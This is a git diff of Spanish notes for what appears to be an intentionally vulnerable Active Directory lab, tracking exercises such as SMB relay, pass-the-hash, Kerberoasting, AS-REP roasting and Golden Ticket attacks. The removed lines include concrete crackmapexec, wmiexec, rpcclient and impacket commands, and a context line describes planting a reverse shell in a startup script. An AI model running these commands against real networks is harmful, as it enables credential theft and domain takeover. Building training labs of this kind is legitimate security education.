@@ -30,7 +30,7 @@ EP010 - start menu(Crear ps1 en el path) - Configurado
 
 
 AD01 - SMB relay + dump SAM + EP - Configurado
-AD02 - Pass the hash + EP
+AD02 - Pass the hash + EP - Configurado
 AD03 - Enumeracion rpcclient + Golden Ticket (file.ccache) - Configurado 
 AD04 - Kerberos - No Configurado, falta poner alguna cosa mas 
 AD05 - ASRPtoast - No Configurado, falta poner alguna cosa mas
@@ -98,85 +98,22 @@ EP010 - start menu(Crear ps1 en el path)
 Se puede leer el los archivos en el directorio C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp, por lo que podemos ver el codigo y este codgio ejecuta otro archivo. En ese archivo, se tiene privilegios de escritura, por lo que se puede poner un comando y asi poder hacer una reverse shell y conectarnos como el usuario que inicie sesion (en este caso el administrador).
 
 
-
 AD01 - SMB relay + dump SAM:
-
+Consiste en realizar un envenamiento de red y obtener un hash NTLMv2, el cual se puede crackear y obtener una credencial valida de un usuario del dominio.
 
 AD02 - Pass the hash:
+Consiste en realizar un envenamiento de red y obtener un hash NTLMv2, pero al no poder crackearlo, es utilizado para dumpear la SAM de un PC, para luego obtener alguna contraseña.
 
-AD03 - Enumeracion rpcclient
-
-
-
-
-
-Video s4vitar:
-
-Posibles vulnerabilidades:
-Poner en la descripcion dek usuario: Contraseña temporal : contraseña y hacer cambiar de usuario asi, a uno con prics admin???
-get-adUser -Identity user -Properties Description/*
+AD03 - Enumeracion rpcclient;
+Consiste en realizar una enumeracion básica con la herramienta rpcclient con una credencial valida que nos otorga el programa al principio. En esta enumeracion, se obtiene la credencial de un usuario dentro del grupo administradores, pudiendo conectarse al DC y realizar un Golde Ticket attack.
 
 
-Comandos:
-Añadir al /etc/hosts:
-IP  genwin genwin.local DC-Company
-
-Validar credenciales : crackmapexec smb 192.168.56.0/24 -u "user" -p "pass*"
-
-Dumpear SAM del DC cuando tienen credenciales administrador: -> EP de ad01???
-crackmapexec smb IP-DC -u "user" -p "pass" --ntds vss
-
-Pass the hash ejemplo:
-wmiexec.py user@IP -hashes hash (ej -> aad3b435b51404eeaad3b435b51404ee:653958e1e70c5e2f1e9e7745cd33561e)
-
-rpcclient -U "" IP -N -> enumdomusers -> Si esta en Null Session habilitado
-
-Enumerar usuarios del AD con cualquier credencial valida de dominio:, puedo tener credenciales de un usuario sin poder conectarse de forma remota y de esta
-forma conseguir las credenciales de un usuario que se pueda conectar de forma remota.
-rpcclient -U "domain\user%pass" IP -c enumdomusers 
-or
-rpcclient -U "domain\user%pass" IP y se ponen luego los comandos 
-+
-rpcclient -U "genwin.local\d.delbarrio%daniel" 192.168.56.252 -c "queryuser 0x44f" -> Para obtener descripcion? Mirar en video, min 53 el bucle 
+AD04 - Kerberos: 
 
 
-Obtener mucha info con credenciales validas:
-ldapdomaindump -u "genwin.local\d.delbarrio" -p "daniel" 192.168.56.252
-+
-python3 -m http.server 
+AD05 - ASRPtoast:
 
 
 
-Kerberos:
-Usuario kerberoasteable:1:03:00
-Configurar:setspn -a genwin.local/user.DC-Company genwin.local\user
-Ahora con cualquier credencial:
-GetUserSPNs.py genwin.local/user:pass
-GetUserSPNs.py genwin. local/user:pass -request -> sale el hash TGS del usuario, este hash se puede romper con john 
 
-
-ASRPtoast:  
-Si el AD tiene el Null session habilitado:1:06:58
-GetNpUser.py genwin.local/ -mo-pass -usersfile users.txt -> enumerar usuarios con rpcclient?
-Como configurar usuarios?? 
-En el DC, ir al usuario -> cuenta -> No pedir autenticacion kerberos previa
-El hash se puede romper.
-
-
-Golden ticket attack:1:09:00
-
-Persistencia, sin passwords:1:17:32
-
-Rubeus:1:20:28
-    - ASRProast
-    - Kerberos
- 
-
-file.scf malicioso par aobtener hash NTLv2: 1:24:00
-
-Bloodhound:1:28:00
-
-Links:
-https://es.linkedin.com/pulse/hashes-netntlm-t%C3%A9cnicas-de-relay-y-contramedidas-lacasa-s%C3%A1nchez
-    
 
